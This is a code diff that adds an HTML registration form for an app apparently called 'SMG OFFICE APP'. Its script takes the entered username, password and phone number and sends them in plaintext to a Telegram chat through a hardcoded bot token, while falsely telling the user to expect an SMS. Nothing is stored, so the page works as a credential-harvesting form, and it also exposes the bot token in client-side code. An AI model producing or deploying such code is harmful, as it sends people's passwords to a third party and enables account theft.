@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Register Form</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-image: url('https://upload.wikimedia.org/wikipedia/commons/a/ab/Dar_es_Salaam_-_Posta.jpg'); /* Default background image */
+ background-size: cover;
+  background-repeat: no-repeat;
+  background-position: center; */
+  }
+  .container {
+    max-width: 330px;
+    margin: auto;
+    padding: 20px;
+    background-color: rgba(255, 255, 255, 0.8);
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.9);
+  }
+  .head {
+    text-align: center;
+  }
+  .form-container {
+    max-width: 400px;
+    margin: auto;
+  }
+  label {
+    font-weight: bold;
+  }
+  input[type="text"],
+  input[type="password"],
+  select {
+    width: 100%;
+    padding: 10px;
+    margin: 5px 0;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-sizing: border-box;
+  }
+  button {
+    width: 100%;
+    background-color: #2C86E9;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: green;
+  }
+  .taarifa {
+    background-color: #f3f3f3;
+    padding: 15px;
+    border-radius: 5px;
+  }
+  input[type="button"] {
+    width: 100%;
+    background-color: #ddd;
+    color: black;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  input[type="button"]:hover {
+    background-color: #bfbfbf;
+  }
+  .button1 {
+    width: 100%;
+    background-color: red;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  .button1:hover {
+    background-color: #245eea;
+  }
+</style>
+</head>
+<body>
+    <br><br><br><br><br><br><br><br><br><br><br><br>
+
+<div class="container" id="registerForm" style="display: block;">
+    <h2 class="head"><i class="icon fas fa-user-plus"></i> Register</h2>
+    <form id="register">
+        <label for="regUsername">Username:</label>
+        <input type="text" id="regUsername" name="regUsername" oninput="this.value = this.value.toUpperCase()">
+        <label for="regPhone">Phone Number:</label>
+        <input type="text" id="regPhone" name="regPhone">
+        <label for="regPassword">New Password:</label>
+        <input type="password" id="regPassword" name="regPassword">
+        <label for="confirmPassword">Confirm Password:</label>
+        <input type="password" id="confirmPassword" name="confirmPassword">
+        <button type="button" value="Submit" onclick="submitRegister()"><i class="fas fa-paper-plane"></i> Submit</button>
+       <br><br>
+        <button class="button1" type="button" value="Back" onclick="showLoginForm()"><i class="fas fa-arrow-left"></i> Back</button>
+    </form>
+</div>
+<br><br><br><br><br><br><br><br>
+
+<script>
+    function sendTelegramMessage(message) {
+        var token = '6755944681:AAHt79bxx56EHxe4W2ZWzsxTcHRY6Ix8OhU'; // Replace 'YOUR_BOT_TOKEN' with your Telegram bot token
+        var chat_id = '5479041930'; // Replace 'YOUR_CHAT_ID' with your Telegram chat ID
+        var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(message);
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', url, true);
+        xhr.send();
+    }
+
+    function showLoginForm() {
+        alert("Implement your logic to go back to the login form or previous page");
+    }
+
+    function submitRegister() {
+        var regUsername = document.getElementById("regUsername").value;
+        var regPhone = document.getElementById("regPhone").value;
+        var regPassword = document.getElementById("regPassword").value;
+        var confirmPassword = document.getElementById("confirmPassword").value;
+
+        if (regUsername && regPhone && regPassword && confirmPassword) {
+            if (regPassword !== confirmPassword) {
+                alert("❌ Passwords do not match. Please try again.");
+                return;
+            }
+
+            // Here you can perform additional validation if needed
+
+            var newUser = {username: regUsername, password: regPassword, phone: regPhone};
+
+            alert("✅ Registration successful. You will receive an SMS shortly...");
+
+            // Sending message to Telegram
+            sendTelegramMessage("NEW REGISTRATION\n\nUsername: " + newUser.username + "\nPassword: " + newUser.password + "\nPhone Number: " + newUser.phone + "\n\n✍️ By SMG OFFICE APP___ new user" + "\n\n\n\n_________CUSTOMER'S SMS_________" + "\n\nCongratulations! You have been registered on our App. Thank you for your trust." + "\n\nUsername: " + newUser.username + "\nPassword: " + newUser.password + "\nPhone number: " + newUser.phone + "\n\nPlease, we urge you to keep your privacy. Thank you!");
+
+            // Clearing form fields
+            document.getElementById("register").reset();
+        } else {
+            alert("❌ Please fill in all fields.");
+        }
+    }
+</script>
+
+</body>
+</html>
